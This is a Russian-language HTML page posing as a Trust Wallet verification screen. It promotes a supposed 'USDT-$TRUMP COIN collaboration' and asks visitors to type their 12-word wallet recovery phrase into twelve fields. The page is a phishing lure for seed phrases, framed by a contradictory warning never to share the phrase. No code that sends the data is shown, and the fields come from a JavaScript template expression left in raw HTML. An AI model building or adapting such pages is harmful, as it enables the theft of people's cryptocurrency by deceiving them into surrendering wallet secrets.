<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Верификация кошелька</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #0B0E11;
            color: #FFFFFF;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background-color: #1E1E1E;
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            text-align: center;
            position: relative;
        }
        .logo {
            width: 80px;
            height: auto;
            margin: 0 auto 16px;
        }
        .crypto-icons {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 16px;
        }
        .crypto-icons img {
            width: 40px;
            height: 40px;
        }
        h1 {
            font-size: 20px;
            margin-bottom: 16px;
            color: #FFFFFF;
        }
        .description {
            font-size: 14px;
            color: #A0A0A0;
            margin-bottom: 20px;
        }
        .seed-input {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 8px;
        }
        .seed-item {
            position: relative;
        }
        .seed-item label {
            position: absolute;
            top: -14px;
            left: 10px;
            font-size: 12px;
            color: #A0A0A0;
            font-weight: bold;
        }
        input {
            padding: 8px;
            font-size: 14px;
            border: 1px solid #333333;
            border-radius: 6px;
            background-color: #2C2C2C;
            color: #FFFFFF;
            text-align: center;
            width: 100%;
            box-sizing: border-box;
        }
        input::placeholder {
            color: #888888;
        }
        input:focus {
            outline: none;
        }
        button {
            margin-top: 20px;
            width: 100%;
            padding: 14px;
            background-color: #1E90FF;
            color: #FFFFFF;
            font-size: 16px;
            font-weight: bold;
            border: none;
            border-radius: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #1C86EE;
        }
        .warning {
            margin-top: 10px;
            font-size: 12px;
            color: #FFD700;
            text-align: center;
        }
        .footer {
            margin-top: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="crypto-icons">
            <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="Bitcoin">
            <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="Ethereum">
            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="Tether">
        </div>
        <img src="https://cryptologos.cc/logos/trust-wallet-trust-logo.png" alt="Trust Wallet Logo" class="logo">
        <h1>Для участия в колоборации USDT-$TRUMP COIN авторизуйте свой кошелёк</h1>
        <p class="description">Введите вашу секретную фразу из 12 слов. Убедитесь, что вы храните её в безопасности!</p>
        <form id="seedForm">
            <div class="seed-input">
                <!-- Поля для ввода -->
                ${Array.from({ length: 12 }, (_, i) => `
                <div class="seed-item">
                    <label for="word${i + 1}">${i + 1}.</label>
                    <input type="text" id="word${i + 1}" name="word${i + 1}" placeholder="слово" required autocomplete="off" autocapitalize="none">
                </div>
                `).join('')}
            </div>
            <button type="submit">Отправить</button>
        </form>
        <div class="footer">
            <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
        </div>
    </div>
</body>
</html>
